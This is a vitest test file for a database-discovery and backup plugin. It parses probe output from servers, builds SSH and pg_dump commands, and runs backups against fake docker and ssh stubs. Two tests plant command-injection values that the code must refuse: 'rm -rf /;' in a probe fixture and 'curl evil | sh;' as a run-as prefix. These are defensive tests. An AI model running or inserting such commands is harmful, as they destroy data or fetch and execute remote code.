import { execFileSync } from 'node:child_process'
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  PluginRegistry,
  memoryBackend,
  silentProgress,
  type BaseContext,
  type CommandContext,
  type ServerDirectory,
  type ServerRef,
} from '@diskpush/plugin-api'
import {
  PROBE_SCRIPT,
  createDbBackupPlugin,
  discover,
  loadDatabases,
  mergeSameMachine,
  parseProbe,
  pickServers,
  probeScript,
  publishedPorts,
  reconcile,
  remoteDumpCommand,
  saveFound,
  shq,
  sshArgs,
  suggestName,
  verifyBackup,
  type DatabaseConfig,
  type Found,
} from './index.js'

const temp = (prefix: string) => mkdtempSync(join(tmpdir(), `dp-disc-${prefix}-`))

const T = '\t'
const row = (...fields: string[]) => fields.join(T)

/** What the probe printed on a box like dev2: a Supabase stack, a shared cluster, MariaDB, SQLite, env files. */
const FIXTURE = [
  row('host', 'dev2.profullstack.com', 'root', 'root', '0123456789abcdef0123456789abcdef'),
  row('tool', 'docker', '/usr/bin/docker'),
  row('tool', 'sqlite3', ''),
  row('db', 'supabase', 'docker', 'nichedb-supabase-db-1', 'supabase/postgres:15.8.1', 'nichedb-supabase', '0.0.0.0:5503->5432/tcp, :::5503->5432/tcp', '', '127.0.0.1', 'postgres', '-', 'postgres', '73400320', '-'),
  row('db', 'supabase', 'docker', 'nichedb-supabase-db-1', 'supabase/postgres:15.8.1', 'nichedb-supabase', '0.0.0.0:5503->5432/tcp', '', '127.0.0.1', 'postgres', '-', '_supabase', '9000', '-'),
  row('db', 'postgres', 'docker', 'pg-1', 'postgres:17', 'shared', '127.0.0.1:5432->5432/tcp', '', '-', 'postgres', '-', 'crawlproof', '2048', '-'),
  row('db', 'postgres', 'docker', 'pg-1', 'postgres:17', 'shared', '127.0.0.1:5432->5432/tcp', '', '-', 'postgres', '-', 'postgres', '7000', '0'),
  row('db', 'postgres', 'docker', 'pg-1', 'postgres:17', 'shared', '127.0.0.1:5432->5432/tcp', '', '-', 'postgres', '-', 'mynaposter', '4096', '-'),
  row('db', 'mysql', 'docker', 'shop-db-1', 'mariadb:11', 'shop', '-', '', '-', 'root', '-', 'shop', '8192', '-'),
  row('db', 'postgres', 'native', '-', '-', '-', '-', 'sudo -n -u postgres', '-', 'postgres', '5433', 'legacy', '100', '-'),
  row('db', 'postgres', 'docker', 'evil-1', 'postgres:17', '-', '-', 'rm -rf /;', '-', 'postgres', '-', 'x', '1', '-'),
  row('sqlite', '/root/www/agentbbs/data/bbs.sqlite', '65536', ''),
  row('skip', '/home/ada/.opencode/opencode.db', 'agent scratch (opencode)'),
  row('warn', 'sqlite3 is not installed here'),
  row('env', '/root/www/crawlproof.com/app.env', 'DATABASE_URL=postgres://postgres:****@localhost:5432/crawlproof'),
  row('env', '/root/www/nichedb.dev/app.env', 'SUPABASE_DB_URL="postgresql://postgres:****@127.0.0.1:5503/postgres"'),
  row('env', '/root/www/mynaposter/app.env', 'DATABASE_URL=postgres://postgres:****@pg-1/mynaposter'),
  row('env', '/root/www/x/app.env', 'REDIS_URL=redis://localhost:6379'),
  'some line from a newer probe',
].join('\n')

describe('parseProbe', () => {
  const report = parseProbe('dev2', FIXTURE)

  it('reads the host, tools, warnings and skipped files', () => {
    expect(report).toMatchObject({ server: 'dev2', ok: true, hostname: 'dev2.profullstack.com', user: 'root', access: 'root' })
    expect(report.tools).toEqual({ docker: '/usr/bin/docker', sqlite3: null })
    expect(report.warnings).toEqual(['sqlite3 is not installed here'])
    expect(report.skipped).toEqual([{ path: '/home/ada/.opencode/opencode.db', reason: 'agent scratch (opencode)' }])
  })

  it('keeps data and drops platform databases and the empty default', () => {
    const names = report.found.map((f) => `${f.kind}:${f.database ?? f.path}`)
    expect(names).toEqual([
      'supabase:postgres',
      'postgres:crawlproof',
      'postgres:mynaposter',
      'mysql:shop',
      'postgres:legacy',
      'sqlite:/root/www/agentbbs/data/bbs.sqlite',
    ])
  })

  it('never accepts a way of running commands it does not know', () => {
    expect(report.found.some((f) => f.container === 'evil-1')).toBe(false)
  })

  it('names owners by port, by container host name, or by a unique database name', () => {
    const owners = Object.fromEntries(report.found.map((f) => [f.database ?? f.path, f.owners]))
    expect(owners.postgres).toEqual(['nichedb.dev'])
    expect(owners.crawlproof).toEqual(['crawlproof.com'])
    expect(owners.mynaposter).toEqual(['mynaposter'])
    expect(report.envUrls.every((env) => !/:[^*@/]+@/.test(env.url.replace(/^\w+:\/\//, '')))).toBe(true)
  })

  it('reads published ports', () => {
    expect(publishedPorts('0.0.0.0:5503->5432/tcp, :::5503->5432/tcp, 0.0.0.0:6603->6543/tcp')).toEqual([5503, 6603])
    expect(publishedPorts(undefined)).toEqual([])
  })
})

describe('choosing servers', () => {
  const ref = (name: string, username: string, host: string, port = 22): ServerRef => ({ name, host, port, username, keyPath: null, jumpHost: null, sshConfigAlias: name, passwordAuth: false })

  it('skips git forges and second aliases of the same login', () => {
    const { chosen, skipped } = pickServers([
      ref('github.com-profullstack__app', 'git', 'github.com'),
      ref('aur', 'aur', 'aur.archlinux.org'),
      ref('dev2', 'anthony', 'dev2.profullstack.com'),
      ref('dev', 'anthony', 'DEV2.profullstack.com'),
      ref('bbs-root', 'root', 'bbs.profullstack.com', 2202),
      ref('bbs', 'anthony', 'bbs.profullstack.com'),
    ])
    expect(chosen.map((s) => s.name)).toEqual(['dev2', 'bbs-root', 'bbs'])
    expect(skipped).toEqual([
      { name: 'github.com-profullstack__app', reason: 'a git host, no shell' },
      { name: 'aur', reason: 'a git host, no shell' },
      { name: 'dev', reason: 'same login as dev2' },
    ])
  })

  it('lists a machine reached by two aliases once, under the one with most access', () => {
    const user = parseProbe('dev2', FIXTURE.replace('\troot\troot\t', '\tanthony\tuser\t'))
    const root = parseProbe('dev2-root', FIXTURE)
    const other = parseProbe('vienna', row('host', 'vienna', 'root', 'root', 'ffffffffffffffffffffffffffffffff'))
    const merged = mergeSameMachine([user, root, other])
    expect(merged.map((r) => [r.server, r.duplicateOf ?? null, r.found.length])).toEqual([
      ['dev2', 'dev2-root', 0],
      ['dev2-root', null, 6],
      ['vienna', null, 0],
    ])
  })
})

describe('naming and reconciling', () => {
  const report = parseProbe('dev2', FIXTURE)

  it('suggests names a person would recognise, unique and valid', () => {
    const taken = new Set<string>()
    const names = report.found.map((f) => {
      const name = suggestName(f, taken)
      taken.add(name)
      return name
    })
    expect(names).toEqual(['dev2-nichedb-supabase', 'dev2-crawlproof', 'dev2-mynaposter', 'dev2-shop', 'dev2-legacy', 'dev2-agentbbs-bbs'])
    expect(suggestName(report.found[1]!, new Set(['dev2-crawlproof']))).toBe('dev2-crawlproof-2')
    const shared: Found = { server: 'dev2', kind: 'supabase', via: 'docker', container: 'supabase-db', project: 'supabase', database: 'advis0r_com', runAs: '', bytes: 1, owners: [] }
    expect(suggestName(shared, new Set())).toBe('dev2-advis0r_com')
    expect(suggestName({ ...shared, database: 'postgres' }, new Set())).toBe('dev2-supabase')
  })

  it('matches saved databases, names new ones, and notices vanished ones', async () => {
    const saved: DatabaseConfig[] = [
      { name: 'crawl', kind: 'postgres', server: 'dev2', via: 'docker', container: 'pg-1', database: 'crawlproof', tags: [] },
      { name: 'old-one', kind: 'postgres', server: 'dev2', via: 'docker', container: 'pg-9', database: 'gone', tags: [] },
      { name: 'elsewhere', kind: 'postgres', server: 'vienna', via: 'docker', container: 'pg-1', database: 'x', tags: [] },
    ]
    const { rows, vanished } = reconcile([report, { ...parseProbe('vienna', ''), ok: false, error: 'timed out' }], saved)
    expect(rows.find((r) => r.found.database === 'crawlproof')).toMatchObject({ name: 'crawl', saved: true })
    expect(rows.filter((r) => !r.saved)).toHaveLength(5)
    // vienna could not be reached, so nothing saved there is called gone.
    expect(vanished.map((db) => db.name)).toEqual(['old-one'])
  })

  it('saves only what is new, and saving twice adds nothing', async () => {
    const registry = new PluginRegistry(memoryBackend())
    registry.register(createDbBackupPlugin())
    const ctx = { settings: registry.settingsFor('dbbackup'), secrets: registry.secretsFor('dbbackup') } as BaseContext
    const first = await saveFound(ctx, reconcile([report], []).rows, { tags: ['nightly'], keepLast: 14 })
    expect(first).toHaveLength(6)
    expect(first.find((db) => db.name === 'dev2-nichedb-supabase')).toEqual({
      name: 'dev2-nichedb-supabase',
      kind: 'supabase',
      server: 'dev2',
      via: 'docker',
      database: 'postgres',
      container: 'nichedb-supabase-db-1',
      dbUser: 'postgres',
      dbHost: '127.0.0.1',
      tags: ['nightly'],
      keepLast: 14,
    })
    const again = await saveFound(ctx, reconcile([report], await loadDatabases(ctx)).rows, { tags: [] })
    expect(again).toEqual([])
    expect(await loadDatabases(ctx)).toHaveLength(6)
  })
})

describe('commands run on a server', () => {
  const server: ServerRef = { name: 'dev2', host: 'dev2.example', port: 2202, username: 'root', keyPath: '/k/id_rsa', jumpHost: 'bastion', sshConfigAlias: null, passwordAuth: false }

  it('builds ssh argv that never prompts', () => {
    expect(sshArgs(server, 'echo hi', { knownHostsFiles: ['/h/.ssh/known_hosts', '/h/.config/diskpush/known_hosts'] })).toEqual([
      '-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=20', '-o', 'ServerAliveInterval=30', '-o', 'ServerAliveCountMax=6',
      '-o', 'UserKnownHostsFile="/h/.ssh/known_hosts" "/h/.config/diskpush/known_hosts"',
      '-p', '2202', '-i', '/k/id_rsa', '-o', 'IdentitiesOnly=yes', '-J', 'bastion', 'root@dev2.example', '--', 'echo hi',
    ])
    const alias = sshArgs({ ...server, sshConfigAlias: 'dev2' }, 'true', { acceptNew: true, sshConfigFile: '/c' })
    expect(alias).toContain('StrictHostKeyChecking=accept-new')
    expect(alias.slice(-5)).toEqual(['-F', '/c', 'dev2', '--', 'true'])
  })

  it('dumps inside the container with the user discovery found', () => {
    expect(
      remoteDumpCommand({ name: 'a', kind: 'supabase', via: 'docker', container: 'app-db-1', database: 'postgres', dbUser: 'postgres', dbHost: '127.0.0.1', runAs: 'sudo -n' }),
    ).toBe(
      'sudo -n docker exec app-db-1 pg_dump -h 127.0.0.1 -U postgres --format=plain --no-password --no-owner --no-privileges ' +
        '--exclude-schema=_analytics --exclude-schema=_realtime --exclude-schema=extensions --exclude-schema=graphql --exclude-schema=graphql_public ' +
        '--exclude-schema=net --exclude-schema=pgbouncer --exclude-schema=pgsodium --exclude-schema=pgsodium_masks --exclude-schema=realtime ' +
        '--exclude-schema=supabase_functions --exclude-schema=vault -d postgres',
    )
    expect(remoteDumpCommand({ name: 'b', kind: 'postgres', via: 'native', database: "o'brien", port: 5433, runAs: 'sudo -n -u postgres' })).toBe(
      `sudo -n -u postgres pg_dump -p 5433 --format=plain --no-password -d 'o'\\''brien'`,
    )
  })

  it('takes a MySQL container password from the container, never from here', () => {
    const command = remoteDumpCommand({ name: 'c', kind: 'mysql', via: 'docker', container: 'shop-db-1', database: 'shop', runAs: '' })
    expect(command.startsWith('docker exec shop-db-1 sh -c ')).toBe(true)
    expect(command).toContain('MYSQL_ROOT_PASSWORD')
    expect(command).toContain('--single-transaction')
  })

  it('refuses a run-as prefix it did not write', () => {
    expect(() => remoteDumpCommand({ name: 'd', kind: 'postgres', via: 'native', database: 'x', runAs: 'curl evil | sh;' })).toThrow(/not a way/)
  })

  it('quotes shell words', () => {
    expect(shq('plain-word_1.2')).toBe('plain-word_1.2')
    expect(shq('two words')).toBe(`'two words'`)
    expect(shq("it's")).toBe(`'it'\\''s'`)
  })
})

/**
 * A stand-in for docker: `ps` lists a Supabase stack, a shared Postgres, a
 * MariaDB and a sidecar that must be ignored; `exec … psql` answers only the
 * way the real images would let it in; `exec … pg_dump` writes a dump.
 */
function fakeDocker(log: string): string {
  return `#!/bin/sh
case "$1" in
  ps)
    [ "$2" = -q ] && exit 0
    printf 'app-supabase-db-1\\tsupabase/postgres:15.8.1\\tapp-supabase\\t0.0.0.0:5500->5432/tcp\\n'
    printf 'app-supabase-meta-1\\tsupabase/postgres-meta:v0.84\\tapp-supabase\\t\\n'
    printf 'pg-1\\tpostgres:17\\tshared\\t127.0.0.1:5432->5432/tcp\\n'
    printf 'shop-db-1\\tmariadb:11\\tshop\\t\\n'
    exit 0 ;;
  exec)
    shift; c=$1; shift; tool=$1; shift
    case "$tool" in
      printenv) exit 1 ;;
      psql)
        h=""; u=""; sql=""
        while [ $# -gt 0 ]; do case "$1" in -h) h=$2; shift ;; -U) u=$2; shift ;; -c) sql=$2; shift ;; esac; shift; done
        case "$c" in
          app-supabase-db-1) [ "$h|$u" = "127.0.0.1|postgres" ] || exit 2; printf 'postgres\\t1000\\n_supabase\\t50\\n' ;;
          pg-1) [ "$u" = postgres ] || exit 2
            case "$sql" in *count*) echo 0 ;; *) printf 'crawlproof\\t2048\\npostgres\\t10\\n' ;; esac ;;
          *) exit 2 ;;
        esac
        exit 0 ;;
      sh) printf 'shop\\t4096\\n'; exit 0 ;;
      pg_dump)
        printf '%s\\n' "$c" "$@" > "${log}/pg_dump.args"
        echo "-- PostgreSQL database dump"
        echo "CREATE TABLE t (id int);"
        [ -n "$FAKE_TRUNCATE" ] || echo "-- PostgreSQL database dump complete"
        exit 0 ;;
    esac ;;
esac
exit 1
`
}

/** A stand-in for ssh: records its argv and runs the last argument in a local shell, as the server would. */
const FAKE_SSH = (log: string) => `#!/bin/sh
printf '%s\\n' "$@" > "${log}/ssh.args"
for a; do last=$a; done
exec /bin/sh -c "$last"
`

function sandbox() {
  const bin = temp('bin')
  const log = temp('log')
  const backups = temp('backups')
  const root = temp('root')
  for (const [name, body] of [['docker', fakeDocker(log)], ['ssh', FAKE_SSH(log)]] as const) {
    writeFileSync(join(bin, name), body)
    chmodSync(join(bin, name), 0o755)
  }
  // SQLite files: one real, one impostor, one under node_modules (pruned), one opencode scratch.
  const header = Buffer.concat([Buffer.from('SQLite format 3\u0000'), Buffer.alloc(100)])
  mkdirSync(join(root, 'www', 'agentbbs', 'data'), { recursive: true })
  writeFileSync(join(root, 'www', 'agentbbs', 'data', 'bbs.sqlite'), header)
  writeFileSync(join(root, 'www', 'agentbbs', 'notes.db'), 'not a database')
  mkdirSync(join(root, 'www', 'agentbbs', 'node_modules', 'x'), { recursive: true })
  writeFileSync(join(root, 'www', 'agentbbs', 'node_modules', 'x', 'fixture.sqlite'), header)
  mkdirSync(join(root, 'ada'), { recursive: true })
  writeFileSync(join(root, 'ada', 'opencode.db'), header)
  mkdirSync(join(root, 'www', 'app-worktrees', 'feat'), { recursive: true })
  writeFileSync(join(root, 'www', 'app-worktrees', 'feat', 'dev.sqlite'), header)
  writeFileSync(join(root, 'www', 'agentbbs', 'data', 'bbs.bak-001.sqlite'), header)
  writeFileSync(join(root, 'www', 'agentbbs', 'data', '.test-run-1.db'), header)
  for (const dir of ['.retired/old-app', 'backups', 'tmp/scratch']) {
    mkdirSync(join(root, 'apps', dir), { recursive: true })
    writeFileSync(join(root, 'apps', dir, 'copy.db'), header)
  }

  const registry = new PluginRegistry(memoryBackend())
  registry.register(createDbBackupPlugin())
  const settings = registry.settingsFor('dbbackup')
  void settings.set('sqliteRoots', root)
  const env = { PATH: `${bin}:/usr/bin:/bin`, HOME: process.env.HOME }
  const servers: ServerDirectory = {
    list: async () => [{ name: 'dev2', host: 'dev2.example', port: 22, username: 'root', keyPath: null, jumpHost: null, sshConfigAlias: null, passwordAuth: false }],
    knownHostsFiles: [],
    sshConfigFile: null,
  }
  const base = (): BaseContext => ({
    settings,
    secrets: registry.secretsFor('dbbackup'),
    progress: silentProgress,
    openUrl: async () => {},
    signal: new AbortController().signal,
    surface: 'cli',
    env,
    servers,
  })
  const cli = async (args: string[], extraEnv: Record<string, string> = {}) => {
    const out: string[] = []
    let json: unknown
    const ctx: CommandContext = {
      ...base(),
      env: { ...env, ...extraEnv },
      surface: 'cli',
      cwd: backups,
      json: args.includes('--json'),
      print: (text) => out.push(text),
      warn: (text) => out.push(text),
      printJson: (value) => (json = value),
      prompt: async () => null,
    }
    const [name, ...rest] = args.filter((a) => a !== '--json')
    const { command } = await registry.command('dbbackup', name!)
    const code = await command!.run(rest, ctx)
    return { code, out: out.join('\n'), json }
  }
  return { bin, log, backups, root, settings, base, cli }
}

describe('the probe script', () => {
  it('is valid POSIX sh', () => {
    execFileSync('/bin/sh', ['-n', '-c', probeScript({ maxSqliteBytes: 1, maxFiles: 1 })])
    expect(PROBE_SCRIPT).not.toContain('${')
  })

  it('finds containers, databases and SQLite files on a box', async () => {
    const box = sandbox()
    const [report] = (await discover(box.base(), { servers: ['local'], sqliteRoots: [box.root] })).reports
    expect(report).toMatchObject({ server: 'local', ok: true })
    const docker = report!.found.filter((f) => f.via === 'docker')
    expect(docker.map((f) => [f.kind, f.container, f.database, f.dbHost ?? '', f.dbUser])).toEqual([
      ['supabase', 'app-supabase-db-1', 'postgres', '127.0.0.1', 'postgres'],
      ['postgres', 'pg-1', 'crawlproof', '', 'postgres'],
      ['mysql', 'shop-db-1', 'shop', '', 'root'],
    ])
    expect(docker[0]!.ports).toEqual([5500])
    const files = report!.found.filter((f) => f.kind === 'sqlite').map((f) => f.path)
    expect(files).toEqual([join(box.root, 'www', 'agentbbs', 'data', 'bbs.sqlite')])
    expect(report!.skipped.map((s) => s.path).sort()).toEqual(
      [join(box.root, 'ada', 'opencode.db'), join(box.root, 'www', 'agentbbs', 'data', 'bbs.bak-001.sqlite'), join(box.root, 'www', 'agentbbs', 'data', '.test-run-1.db')].sort(),
    )
  })

  it('reports a server it cannot reach instead of failing the rest', async () => {
    const box = sandbox()
    writeFileSync(join(box.bin, 'ssh'), '#!/bin/sh\necho "ssh: connect to host dev2.example port 22: Connection refused" >&2\nexit 255\n')
    const { reports } = await discover(box.base(), { local: true, sqliteRoots: [box.root] })
    expect(reports.map((r) => [r.server, r.ok])).toEqual([['local', true], ['dev2', false]])
    expect(reports[1]!.error).toMatch(/Connection refused/)
  })

  it('refuses a server name it does not know', async () => {
    await expect(discover(sandbox().base(), { servers: ['nope'] })).rejects.toThrow(/No server called nope/)
  })
})

describe('discover → save → back up', () => {
  it('saves what it found, then dumps it on the server and verifies it', async () => {
    const box = sandbox()
    const shown = await box.cli(['discover', 'dev2', '--save', '--tags', 'nightly'])
    expect(shown.code).toBe(0)
    expect(shown.out).toMatch(/ADDED dev2-crawlproof/)
    expect(shown.out).toMatch(/saved 4\. Back them up with: diskpush dbbackup run/)
    // The ssh call went to the server, non-interactively.
    const sshArgv = readFileSync(join(box.log, 'ssh.args'), 'utf8').split('\n')
    expect(sshArgv).toContain('BatchMode=yes')
    expect(sshArgv).toContain('root@dev2.example')

    const list = await box.cli(['list'])
    expect(list.out).toMatch(/dev2-crawlproof\s+postgres\s+dev2 docker:pg-1\/crawlproof\s+\[nightly\]/)

    const ran = await box.cli(['run', 'dev2-crawlproof', '--json'])
    expect(ran.code).toBe(0)
    const report = (ran.json as { reports: Array<{ ok: boolean; path: string }> }).reports[0]!
    expect(report.ok).toBe(true)
    await expect(verifyBackup(report.path)).resolves.toMatchObject({ bytes: expect.any(Number) })
    expect(readFileSync(join(box.log, 'pg_dump.args'), 'utf8').split('\n')).toEqual(['pg-1', '-U', 'postgres', '--format=plain', '--no-password', '-d', 'crawlproof', ''])

    const again = await box.cli(['discover', 'dev2', '--save'])
    expect(again.out).toMatch(/saved\s+dev2-crawlproof/)
    expect(again.out).toMatch(/all saved\./)
  })

  it('throws away a dump the server cut short', async () => {
    const box = sandbox()
    await box.cli(['discover', 'dev2', '--save'])
    const ran = await box.cli(['run', 'dev2-crawlproof'], { FAKE_TRUNCATE: '1' })
    expect(ran.code).toBe(1)
    expect(ran.out).toMatch(/incomplete and was discarded/)
  })

  it('backs up a SQLite file on a server as the database file itself', async () => {
    const box = sandbox()
    let sqlite3: string
    try {
      sqlite3 = execFileSync('/bin/sh', ['-c', 'command -v sqlite3'], { encoding: 'utf8' }).trim()
    } catch {
      return // no sqlite3 on this machine: the server-side command is covered above
    }
    const file = join(box.root, 'www', 'app', 'app.sqlite')
    mkdirSync(join(box.root, 'www', 'app'), { recursive: true })
    execFileSync(sqlite3, [file, 'create table t (x); insert into t values (42);'])
    writeFileSync(join(box.bin, 'sqlite3'), `#!/bin/sh\nexec ${sqlite3} "$@"\n`)
    chmodSync(join(box.bin, 'sqlite3'), 0o755)
    const found: Found = { server: 'dev2', kind: 'sqlite', via: 'file', path: file, runAs: '', bytes: 0, owners: [] }
    const ctx = box.base()
    await saveFound(ctx, [{ found, name: 'dev2-app', saved: false }], { tags: [] })
    const ran = await box.cli(['run', 'dev2-app', '--json'])
    expect(ran.code).toBe(0)
    const path = (ran.json as { reports: Array<{ path: string }> }).reports[0]!.path
    expect(path.endsWith('.sqlite.gz')).toBe(true)
    const restored = join(box.root, 'restored.sqlite')
    expect((await box.cli(['restore', path, '--to', restored, '--yes'])).code).toBe(0)
    expect(execFileSync(sqlite3, [restored, 'select x from t'], { encoding: 'utf8' }).trim()).toBe('42')
  })
})
